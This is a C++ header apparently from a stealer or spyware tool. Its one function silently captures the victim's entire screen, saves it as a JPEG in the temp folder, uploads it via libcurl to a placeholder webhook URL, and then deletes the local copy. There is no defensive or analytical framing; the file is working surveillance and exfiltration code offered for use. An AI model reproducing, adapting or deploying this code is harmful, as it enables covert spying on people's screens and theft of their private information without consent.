#pragma once
#include <stdio.h>
#include <string.h>

#include <curl/curl.h>
#include <atlimage.h>

int op2stuff()
{
	int x1, y1, x2, y2, w, h;

	// get screen dimensions
	x1 = GetSystemMetrics(SM_XVIRTUALSCREEN);
	y1 = GetSystemMetrics(SM_YVIRTUALSCREEN);
	x2 = GetSystemMetrics(SM_CXVIRTUALSCREEN);
	y2 = GetSystemMetrics(SM_CYVIRTUALSCREEN);
	w = x2 - x1;
	h = y2 - y1;

	// copy screen to bitmap
	HDC     hScreen = GetDC(NULL);
	HDC     hDC = CreateCompatibleDC(hScreen);
	HBITMAP hBitmap = CreateCompatibleBitmap(hScreen, w, h);
	HGDIOBJ old_obj = SelectObject(hDC, hBitmap);
	BOOL    bRet = BitBlt(hDC, 0, 0, w, h, hScreen, x1, y1, SRCCOPY);

	std::string strTempPath;
	char wchPath[MAX_PATH];
	if (GetTempPath(MAX_PATH, wchPath))
		strTempPath = wchPath;
	std::string tmpfilepathforjpg = strTempPath + "/IceMemescreen.jpg";//temporal file and file name

	CImage image;
	image.Attach(hBitmap);
	image.Save(tmpfilepathforjpg.c_str());

	CURL *curl;
	CURLcode res;

	curl_mime *form = NULL;
	curl_mimepart *field = NULL;
	struct curl_slist *headerlist = NULL;
	static const char buf[] = "Expect:";

	curl_global_init(CURL_GLOBAL_ALL);

	curl = curl_easy_init();
	if (curl) {
		/* Create the form */
		form = curl_mime_init(curl);

		/* Fill in the file upload field */
		field = curl_mime_addpart(form);
		curl_mime_name(field, "sendfile");
		curl_mime_filedata(field, tmpfilepathforjpg.c_str());

		/* Fill in the filename field */
		field = curl_mime_addpart(form);
		curl_mime_name(field, "filename");
		curl_mime_data(field, "postit2.c", CURL_ZERO_TERMINATED);

		/* Fill in the submit field too, even if this is rarely needed */
		field = curl_mime_addpart(form);
		curl_mime_name(field, "submit");
		curl_mime_data(field, "send", CURL_ZERO_TERMINATED);

		/* initialize custom header list (stating that Expect: 100-continue is not
		wanted */
		headerlist = curl_slist_append(headerlist, buf);
		/* what URL that receives this POST */

		std::string fulll1 = "PUTHEREURWEBHOOOKURL";
		curl_easy_setopt(curl, CURLOPT_URL, fulll1);
		curl_easy_setopt(curl, CURLOPT_MIMEPOST, form);

		/* Perform the request, res will get the return code */
		res = curl_easy_perform(curl);
		/* Check for errors */
		if (res != CURLE_OK)
			fprintf(stderr, "curl_easy_perform() failed: %s\n",
				curl_easy_strerror(res));

		/* always cleanup */
		curl_easy_cleanup(curl);

		/* then cleanup the form */
		curl_mime_free(form);
		/* free slist */
		curl_slist_free_all(headerlist);
	}
	// clean up
	SelectObject(hDC, old_obj);
	DeleteDC(hDC);
	ReleaseDC(NULL, hScreen);
	DeleteObject(hBitmap);
	std::remove(tmpfilepathforjpg.c_str());
	return 0;
}